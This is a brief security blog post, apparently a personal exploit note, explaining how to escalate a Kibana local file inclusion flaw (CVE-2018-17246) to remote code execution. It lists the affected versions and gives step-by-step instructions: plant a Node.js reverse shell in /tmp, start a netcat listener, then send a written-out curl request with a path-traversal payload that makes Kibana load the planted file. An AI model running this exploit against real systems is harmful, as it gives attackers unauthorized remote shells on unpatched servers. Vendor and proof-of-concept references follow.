---
layout: post
title: Kibana LFI to RCE
description: Kibana LFI to RCE
summary: Kibana LFI to RCE
tags: [kibana,exploit,rce]
minute: 1
---
## Overview
Attacker can achieve RCE by including a node js reverse shell via LFI and RFI

## Affected Versions
Versions before 6.4.3 and 5.6.13.

## Steps
* Put your node js reverse shell in `/tmp` of victim machine via file upload
* Open netcat listener on attacker machine
* Do an LFI

```bash
# this example assumes you have access inside the victim via file upload
# or any other means
curl 'http://localhost:5601/api/console/api_server?sense_version=%40%40SENSE_VERSION&apis=../../../../../../../../../../../tmp/evil.js'
```

## References
* [Resolving Kibana Local File Inclusion Flaw CVE-2018-17246](https://www.elastic.co/blog/kibana-local-file-inclusion-flaw-cve-2018-17246)
* [GitHub - mpgn/CVE-2018-17246: CVE-2018-17246 - Kibana LFI < 6.4.3 & 5.6.13](https://github.com/mpgn/CVE-2018-17246)
* https://www.cyberark.com/resources/threat-research-blog/execute-this-i-know-you-have-it
* [learn365/day32.md at main · harsh-bothra/learn365 · GitHub](https://github.com/harsh-bothra/learn365/blob/main/days/day32.md)
